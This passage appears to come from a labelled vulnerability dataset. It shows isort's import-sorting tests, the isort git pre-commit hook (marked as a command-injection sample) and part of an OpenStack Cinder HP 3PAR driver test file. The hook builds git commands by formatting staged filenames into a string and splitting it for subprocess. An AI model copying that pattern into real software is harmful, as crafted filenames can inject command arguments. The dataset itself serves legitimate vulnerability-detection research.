                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import z, x, y, w\n'
                           'from a import i as j\n'
                           'from a import g as h\n'
                           'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b, b as c, b as d, e as f, g as h, i as j, w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as d, b as c, z, x, y, w, i as j, g as h, e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import z, x, y, w\n'
                           'from a import i as j\n'
                           'from a import g as h\n'
                           'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b, b as d, b as c, z, x, y, w, i as j, g as h, e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'


def test_noqa_issue_679():
    # Test to ensure that NOQA notation is being observed as expected
    test_input = ('import os\n'
                  '\n'
                  'import requestsss\n'
                  'import zed # NOQA\n'
                  'import ujson # NOQA\n'
                  '\n'
                  'import foo')
    test_output = ('import os\n'
                   '\n'
                   'import foo\n'
                   'import requestsss\n'
                   '\n'
                   'import zed # NOQA\n'
                   'import ujson # NOQA\n')
    assert SortImports(file_contents=test_input).output == test_output


def test_extract_multiline_output_wrap_setting_from_a_config_file(tmpdir: py.path.local) -> None:
    editorconfig_contents = [
        'root = true',
        ' [*.py]',
        'multi_line_output = 5'
    ]
    config_file = tmpdir.join('.editorconfig')
    config_file.write('\n'.join(editorconfig_contents))

    config = settings.from_path(str(tmpdir))
    assert config['multi_line_output'] == WrapModes.VERTICAL_GRID_GROUPED


def test_ensure_support_for_non_typed_but_cased_alphabetic_sort_issue_890():
    test_input = ('from pkg import BALL\n'
                  'from pkg import RC\n'
                  'from pkg import Action\n'
                  'from pkg import Bacoo\n'
                  'from pkg import RCNewCode\n'
                  'from pkg import actual\n'
                  'from pkg import rc\n'
                  'from pkg import recorder\n')
    expected_output = ('from pkg import Action\n'
                       'from pkg import BALL\n'
                       'from pkg import Bacoo\n'
                       'from pkg import RC\n'
                       'from pkg import RCNewCode\n'
                       'from pkg import actual\n'
                       'from pkg import rc\n'
                       'from pkg import recorder\n')
    assert SortImports(file_contents=test_input, case_sensitive=True, order_by_type=False,
                       force_single_line=True).output == expected_output


def test_to_ensure_empty_line_not_added_to_file_start_issue_889():
    test_input = ('# comment\n'
                  'import os\n'
                  '# comment2\n'
                  'import sys\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_correctly_handling_of_whitespace_only_issue_811(capsys):
    test_input = ('import os\n'
                  'import sys\n'
                  '\n'
                  '\x0c\n'
                  'def my_function():\n'
                  '    print(""hi"")\n')
    SortImports(file_contents=test_input, ignore_whitespace=True)
    out, err = capsys.readouterr()
    assert out == ''
    assert err == ''


def test_standard_library_deprecates_user_issue_778():
    test_input = ('import os\n'
                  '\n'
                  'import user\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_settings_path_skip_issue_909(tmpdir):
    base_dir = tmpdir.mkdir('project')
    config_dir = base_dir.mkdir('conf')
    config_dir.join('.isort.cfg').write('[isort]\n'
                                        'skip =\n'
                                        '    file_to_be_skipped.py\n'
                                        'skip_glob =\n'
                                        '    *glob_skip*\n')

    base_dir.join('file_glob_skip.py').write('import os\n'
                                             '\n'
                                             'print(""Hello World"")\n'
                                             '\n'
                                             'import sys\n')
    base_dir.join('file_to_be_skipped.py').write('import os\n'
                                                 '\n'
                                                 'print(""Hello World"")'
                                                 '\n'
                                                 'import sys\n')

    test_run_directory = os.getcwd()
    os.chdir(str(base_dir))
    with pytest.raises(Exception):  # without the settings path provided: the command should not skip & identify errors
        subprocess.run(['isort', '--check-only'], check=True)
    result = subprocess.run(
        ['isort', '--check-only', '--settings-path=conf/.isort.cfg'],
        stdout=subprocess.PIPE,
        check=True
    )
    os.chdir(str(test_run_directory))

    assert b'skipped 2' in result.stdout.lower()


def test_skip_paths_issue_938(tmpdir):
    base_dir = tmpdir.mkdir('project')
    config_dir = base_dir.mkdir('conf')
    config_dir.join('.isort.cfg').write('[isort]\n'
                                        'line_length = 88\n'
                                        'multi_line_output = 4\n'
                                        'lines_after_imports = 2\n'
                                        'skip_glob =\n'
                                        '    migrations/**.py\n')
    base_dir.join('dont_skip.py').write('import os\n'
                                        '\n'
                                        'print(""Hello World"")'
                                        '\n'
                                        'import sys\n')

    migrations_dir = base_dir.mkdir('migrations')
    migrations_dir.join('file_glob_skip.py').write('import os\n'
                                                   '\n'
                                                   'print(""Hello World"")\n'
                                                   '\n'
                                                   'import sys\n')

    test_run_directory = os.getcwd()
    os.chdir(str(base_dir))
    result = subprocess.run(
        ['isort', 'dont_skip.py', 'migrations/file_glob_skip.py'],
        stdout=subprocess.PIPE,
        check=True,
    )
    os.chdir(str(test_run_directory))

    assert b'skipped' not in result.stdout.lower()

    os.chdir(str(base_dir))
    result = subprocess.run(
        ['isort', '--filter-files', '--settings-path=conf/.isort.cfg', 'dont_skip.py', 'migrations/file_glob_skip.py'],
        stdout=subprocess.PIPE,
        check=True,
    )
    os.chdir(str(test_run_directory))

    assert b'skipped 1' in result.stdout.lower()


def test_failing_file_check_916():
    test_input = ('#!/usr/bin/env python\n'
                  '# -*- coding: utf-8 -*-\n'
                  'from __future__ import unicode_literals\n')
    expected_output = ('#!/usr/bin/env python\n'
                       '# -*- coding: utf-8 -*-\n'
                       '# FUTURE\n'
                       'from __future__ import unicode_literals\n')
    settings = {'known_future_library': 'future',
                'import_heading_future': 'FUTURE',
                'sections': ['FUTURE', 'STDLIB', 'NORDIGEN', 'FIRSTPARTY', 'THIRDPARTY', 'LOCALFOLDER'],
                'indent': '    ',
                'multi_line_output': 3,
                'lines_after_imports': 2}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **settings).output == expected_output
    assert SortImports(file_contents=expected_output, **settings).output == expected_output
    assert not SortImports(file_contents=expected_output, check=True, **settings).incorrectly_sorted


def test_import_heading_issue_905():
    config = {'import_heading_stdlib': 'Standard library imports',
              'import_heading_thirdparty': 'Third party imports',
              'import_heading_firstparty': 'Local imports',
              'known_third_party': ['numpy'],
              'known_first_party': ['oklib']}  # type: Dict[str, Any]
    test_input = ('# Standard library imports\n'
                  'import os.path as osp\n'
                  '\n'
                  '# Third party imports\n'
                  'import numpy as np\n'
                  '\n'
                  '# Local imports\n'
                  'from oklib.plot_ok import imagesc\n')
    assert SortImports(file_contents=test_input, **config).output == test_input


def test_isort_keeps_comments_issue_691():
    test_input = ('import os\n'
                  '# This will make sure the app is always imported when\n'
                  '# Django starts so that shared_task will use this app.\n'
                  'from .celery import app as celery_app  # noqa\n'
                  '\n'
                  'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\n'
                  '\n'
                  'def path(*subdirectories):\n'
                  '    return os.path.join(PROJECT_DIR, *subdirectories)\n')
    expected_output = ('import os\n'
                       '\n'
                       '# This will make sure the app is always imported when\n'
                       '# Django starts so that shared_task will use this app.\n'
                       'from .celery import app as celery_app  # noqa\n'
                       '\n'
                       'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\n'
                       '\n'
                       'def path(*subdirectories):\n'
                       '    return os.path.join(PROJECT_DIR, *subdirectories)\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_pyi_formatting_issue_942(tmpdir):
    test_input = ('import os\n'
                  '\n'
                  '\n'
                  'def my_method():\n')
    expected_py_output = test_input.splitlines()
    expected_pyi_output = ('import os\n'
                           '\n'
                           'def my_method():\n').splitlines()
    assert SortImports(file_contents=test_input).output.splitlines() == expected_py_output
    assert SortImports(file_contents=test_input,
                       extension=""pyi"").output.splitlines() == expected_pyi_output

    source_py = tmpdir.join('source.py')
    source_py.write(test_input)
    assert SortImports(file_path=str(source_py)).output.splitlines() == expected_py_output

    source_pyi = tmpdir.join('source.pyi')
    source_pyi.write(test_input)
    assert SortImports(file_path=str(source_pyi)).output.splitlines() == expected_pyi_output


def test_python_version():
    from isort.main import parse_args

    # test that the py_version can be added as flag
    args = parse_args(['-py=2.7'])
    assert args[""py_version""] == ""2.7""

    args = parse_args(['--python-version=3'])
    assert args[""py_version""] == ""3""

    test_input = ('import os\n'
                  '\n'
                  'import user\n')
    assert SortImports(file_contents=test_input, py_version=""3"").output == test_input

    # user is part of the standard library in python 2
    output_python_2 = ('import os\n'
                       'import user\n')
    assert SortImports(file_contents=test_input, py_version=""2.7"").output == output_python_2

    test_input = ('import os\nimport xml')

    print(SortImports(file_contents=test_input, py_version=""all"").output )
/n/n/n",0,command_injection
9,197,1ab38f4f7840a3c19bf961a24630a992a8373a76,"/isort/hooks.py/n/n""""""isort.py.

Defines a git hook to allow pre-commit warnings and errors about import order.

usage:
    exit_code = git_hook(strict=True|False, modify=True|False)

Copyright (C) 2015  Helen Sherwood-Taylor

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import subprocess
from typing import List

from isort import SortImports


def get_output(command: str) -> bytes:
    """"""
    Run a command and return raw output

    :param str command: the command to run
    :returns: the stdout output of the command
    """"""
    return subprocess.check_output(command.split())


def get_lines(command: str) -> List[str]:
    """"""
    Run a command and return lines of output

    :param str command: the command to run
    :returns: list of whitespace-stripped lines output by command
    """"""
    stdout = get_output(command)
    return [line.strip().decode() for line in stdout.splitlines()]


def git_hook(strict=False, modify=False):
    """"""
    Git pre-commit hook to check staged files for isort errors

    :param bool strict - if True, return number of errors on exit,
        causing the hook to fail. If False, return zero so it will
        just act as a warning.
    :param bool modify - if True, fix the sources if they are not
        sorted properly. If False, only report result without
        modifying anything.

    :return number of errors if in strict mode, 0 otherwise.
    """"""

    # Get list of files modified and staged
    diff_cmd = ""git diff-index --cached --name-only --diff-filter=ACMRTUXB HEAD""
    files_modified = get_lines(diff_cmd)

    errors = 0
    for filename in files_modified:
        if filename.endswith('.py'):
            # Get the staged contents of the file
            staged_cmd = ""git show :%s"" % filename
            staged_contents = get_output(staged_cmd)

            sort = SortImports(
                file_path=filename,
                file_contents=staged_contents.decode(),
                check=True
            )

            if sort.incorrectly_sorted:
                errors += 1
                if modify:
                    SortImports(
                        file_path=filename,
                        file_contents=staged_contents.decode(),
                        check=False,
                    )

    return errors if strict else 0
/n/n/n",1,command_injection
10,76,c55589b131828f3a595903f6796cb2d0babb772f,"cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python
# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Unit tests for OpenStack Cinder volume drivers
""""""
import ast
import mox
import shutil
import tempfile

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver
from cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver

LOG = logging.getLogger(__name__)

HP3PAR_DOMAIN = 'OpenStack',
HP3PAR_CPG = 'OpenStackCPG',
HP3PAR_CPG_SNAP = 'OpenStackCPGSnap'
CLI_CR = '\r\n'


class FakeHP3ParClient(object):

    api_url = None
    debug = False

    volumes = []
    hosts = []
    vluns = []
    cpgs = [
        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 8192},
         'SAUsage': {'rawTotalMiB': 24576,
                     'rawUsedMiB': 768,
                     'totalMiB': 8192,
                     'usedMiB': 256},
         'SDGrowth': {'LDLayout': {'RAIDType': 4,
                      'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 32768},
         'SDUsage': {'rawTotalMiB': 49152,
                     'rawUsedMiB': 1023,
                     'totalMiB': 36864,
                     'usedMiB': 768},
         'UsrUsage': {'rawTotalMiB': 57344,
                      'rawUsedMiB': 43349,
                      'totalMiB': 43008,
                      'usedMiB': 32512},
         'additionalStates': [],
         'degradedStates': [],
         'domain': HP3PAR_DOMAIN,
         'failedStates': [],
         'id': 5,
         'name': HP3PAR_CPG,
         'numFPVVs': 2,
         'numTPVVs': 0,
         'state': 1,
         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]

    def __init__(self, api_url):
        self.api_url = api_url
        self.volumes = []
        self.hosts = []
        self.vluns = []

    def debug_rest(self, flag):
        self.debug = flag

    def login(self, username, password, optional=None):
        return None

    def logout(self):
        return None

    def getVolumes(self):
        return self.volumes

    def getVolume(self, name):
        if self.volumes:
            for volume in self.volumes:
                if volume['name'] == name:
                    return volume

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VOLUME '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def createVolume(self, name, cpgName, sizeMiB, optional=None):
        new_vol = {'additionalStates': [],
                   'adminSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 384,
                                  'reservedMiB': 128,
                                  'usedMiB': 128},
                   'baseId': 115,
                   'comment': optional['comment'],
                   'copyType': 1,
                   'creationTime8601': '2012-10-22T16:37:57-07:00',
                   'creationTimeSec': 1350949077,
                   'degradedStates': [],
                   'domain': HP3PAR_DOMAIN,
                   'failedStates': [],
                   'id': 115,
                   'name': name,
                   'policies': {'caching': True,
                                'oneHost': False,
                                'staleSS': True,
                                'system': False,
                                'zeroDetect': False},
                   'provisioningType': 1,
                   'readOnly': False,
                   'sizeMiB': sizeMiB,
                   'snapCPG': optional['snapCPG'],
                   'snapshotSpace': {'freeMiB': 0,
                                     'rawReservedMiB': 683,
                                     'reservedMiB': 512,
                                     'usedMiB': 512},
                   'ssSpcAllocLimitPct': 0,
                   'ssSpcAllocWarningPct': 0,
                   'state': 1,
                   'userCPG': cpgName,
                   'userSpace': {'freeMiB': 0,
                                 'rawReservedMiB': 41984,
                                 'reservedMiB': 31488,
                                 'usedMiB': 31488},
                   'usrSpcAllocLimitPct': 0,
                   'usrSpcAllocWarningPct': 0,
                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',
                   'wwn': '50002AC00073383D'}
        self.volumes.append(new_vol)
        return None

    def deleteVolume(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createSnapshot(self, name, copyOfName, optional=None):
        new_snap = {'additionalStates': [],
                    'adminSpace': {'freeMiB': 0,
                                   'rawReservedMiB': 0,
                                   'reservedMiB': 0,
                                   'usedMiB': 0},
                    'baseId': 342,
                    'comment': optional['comment'],
                    'copyOf': copyOfName,
                    'copyType': 3,
                    'creationTime8601': '2012-11-09T15:13:28-08:00',
                    'creationTimeSec': 1352502808,
                    'degradedStates': [],
                    'domain': HP3PAR_DOMAIN,
                    'expirationTime8601': '2012-11-09T17:13:28-08:00',
                    'expirationTimeSec': 1352510008,
                    'failedStates': [],
                    'id': 343,
                    'name': name,
                    'parentId': 342,
                    'policies': {'caching': True,
                                 'oneHost': False,
                                 'staleSS': True,
                                 'system': False,
                                 'zeroDetect': False},
                    'provisioningType': 3,
                    'readOnly': True,
                    'retentionTime8601': '2012-11-09T16:13:27-08:00',
                    'retentionTimeSec': 1352506407,
                    'sizeMiB': 256,
                    'snapCPG': HP3PAR_CPG_SNAP,
                    'snapshotSpace': {'freeMiB': 0,
                                      'rawReservedMiB': 0,
                                      'reservedMiB': 0,
                                      'usedMiB': 0},
                    'ssSpcAllocLimitPct': 0,
                    'ssSpcAllocWarningPct': 0,
                    'state': 1,
                    'userCPG': HP3PAR_CPG,
                    'userSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 0,
                                  'reservedMiB': 0,
                                  'usedMiB': 0},
                    'usrSpcAllocLimitPct': 0,
                    'usrSpcAllocWarningPct': 0,
                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',
                    'wwn': '50002AC00157383D'}
        self.volumes.append(new_snap)
        return None

    def deleteSnapshot(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createCPG(self, name, optional=None):
        cpg = {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 8192},
               'SAUsage': {'rawTotalMiB': 24576,
                           'rawUsedMiB': 768,
                           'totalMiB': 8192,
                           'usedMiB': 256},
               'SDGrowth': {'LDLayout': {'RAIDType': 4,
                            'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 32768},
               'SDUsage': {'rawTotalMiB': 49152,
                           'rawUsedMiB': 1023,
                           'totalMiB': 36864,
                           'usedMiB': 768},
               'UsrUsage': {'rawTotalMiB': 57344,
                            'rawUsedMiB': 43349,
                            'totalMiB': 43008,
                            'usedMiB': 32512},
               'additionalStates': [],
               'degradedStates': [],
               'domain': HP3PAR_DOMAIN,
               'failedStates': [],
               'id': 1,
               'name': name,
               'numFPVVs': 2,
               'numTPVVs': 0,
               'state': 1,
               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}

        new_cpg = cpg.copy()
        new_cpg.update(optional)
        self.cpgs.append(new_cpg)

    def getCPGs(self):
        return self.cpgs

    def getCPG(self, name):
        if self.cpgs:
            for cpg in self.cpgs:
                if cpg['name'] == name:
                    return cpg

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""CPG '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def deleteCPG(self, name):
        cpg = self.getCPG(name)
        self.cpgs.remove(cpg)

    def createVLUN(self, volumeName, lun, hostname=None,
                   portPos=None, noVcn=None,
                   overrideLowerPriority=None):

        vlun = {'active': False,
                'failedPathInterval': 0,
                'failedPathPol': 1,
                'hostname': hostname,
                'lun': lun,
                'multipathing': 1,
                'portPos': portPos,
                'type': 4,
                'volumeName': volumeName,
                'volumeWWN': '50002AC00077383D'}
        self.vluns.append(vlun)
        return None

    def deleteVLUN(self, name, lunID, hostname=None, port=None):
        vlun = self.getVLUN(name)
        self.vluns.remove(vlun)

    def getVLUNs(self):
        return self.vluns

    def getVLUN(self, volumeName):
        for vlun in self.vluns:
            if vlun['volumeName'] == volumeName:
                return vlun

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VLUN '%s' was not found"" % volumeName}
        raise hpexceptions.HTTPNotFound(msg)


class HP3PARBaseDriver():

    VOLUME_ID = ""d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    CLONE_ID = ""d03338a9-9115-48a3-8dfc-000000000000""
    VOLUME_NAME = ""volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    SNAPSHOT_ID = ""2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    SNAPSHOT_NAME = ""snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    VOLUME_3PAR_NAME = ""osv-0DM4qZEVSKON-DXN-NwVpw""
    SNAPSHOT_3PAR_NAME = ""oss-L4I73ONuTci9Fd4ceij-MQ""
    FAKE_HOST = ""fakehost""
    USER_ID = '2689d9a913974c008b1d859013f23607'
    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'
    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'
    FAKE_DESC = 'test description name'
    FAKE_FC_PORTS = ['0987654321234', '123456789000987']
    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}
    VVS_NAME = ""myvvs""
    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',
                                    'iqn': ('iqn.2000-05.com.3pardata:'
                                            '21810002ac00383d'),
                                    'ip_port': '3262'}}

    volume = {'name': VOLUME_NAME,
              'id': VOLUME_ID,
              'display_name': 'Foo Volume',
              'size': 2,
              'host': FAKE_HOST,
              'volume_type': None,
              'volume_type_id': None}

    volume_qos = {'name': VOLUME_NAME,
                  'id': VOLUME_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': FAKE_HOST,
                  'volume_type': None,
                  'volume_type_id': 'gold'}

    snapshot = {'name': SNAPSHOT_NAME,
                'id': SNAPSHOT_ID,
                'user_id': USER_ID,
                'project_id': PROJECT_ID,
                'volume_id': VOLUME_ID_SNAP,
                'volume_name': VOLUME_NAME,
                'status': 'creating',
                'progress': '0%',
                'volume_size': 2,
                'display_name': 'fakesnap',
                'display_description': FAKE_DESC}

    connector = {'ip': '10.0.0.2',
                 'initiator': 'iqn.1993-08.org.debian:01:222',
                 'wwpns': [""123456789012345"", ""123456789054321""],
                 'wwnns': [""223456789012345"", ""223456789054321""],
                 'host': 'fakehost'}

    volume_type = {'name': 'gold',
                   'deleted': False,
                   'updated_at': None,
                   'extra_specs': {'qos:maxBWS': '50',
                                   'qos:maxIOPS': '1000'},
                   'deleted_at': None,
                   'id': 'gold'}

    def setup_configuration(self):
        configuration = mox.MockObject(conf.Configuration)
        configuration.hp3par_debug = False
        configuration.hp3par_username = 'testUser'
        configuration.hp3par_password = 'testPassword'
        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'
        configuration.hp3par_domain = HP3PAR_DOMAIN
        configuration.hp3par_cpg = HP3PAR_CPG
        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP
        configuration.iscsi_ip_address = '1.1.1.2'
        configuration.iscsi_port = '1234'
        configuration.san_ip = '2.2.2.2'
        configuration.san_login = 'test'
        configuration.san_password = 'test'
        configuration.hp3par_snapshot_expiration = """"
        configuration.hp3par_snapshot_retention = """"
        configuration.hp3par_iscsi_ips = []
        return configuration

    def setup_fakes(self):
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_3par_host"",
                       self.fake_get_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_delete_3par_host"",
                       self.fake_delete_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_3par_vlun"",
                       self.fake_create_3par_vlun)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                       self.fake_get_ports)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)

    def clear_mox(self):
        self.mox.ResetAll()
        self.stubs.UnsetAll()

    def fake_create_client(self):
        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)

    def fake_get_cpg(self, volume, allowSnap=False):
        return HP3PAR_CPG

    def fake_set_connections(self):
        return

    def fake_get_domain(self, cpg):
        return HP3PAR_DOMAIN

    def fake_extend_volume(self, volume, new_size):
        vol = self.driver.common.client.getVolume(volume['name'])
        old_size = vol['sizeMiB']
        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}
        self.driver.common.client.deleteVolume(volume['name'])
        self.driver.common.client.createVolume(vol['name'],
                                               vol['userCPG'],
                                               new_size, option)

    def fake_get_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            return self._hosts[hostname]

    def fake_delete_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            del self._hosts[hostname]

    def fake_create_3par_vlun(self, volume, hostname):
        self.driver.common.client.createVLUN(volume, 19, hostname)

    def fake_get_ports(self):
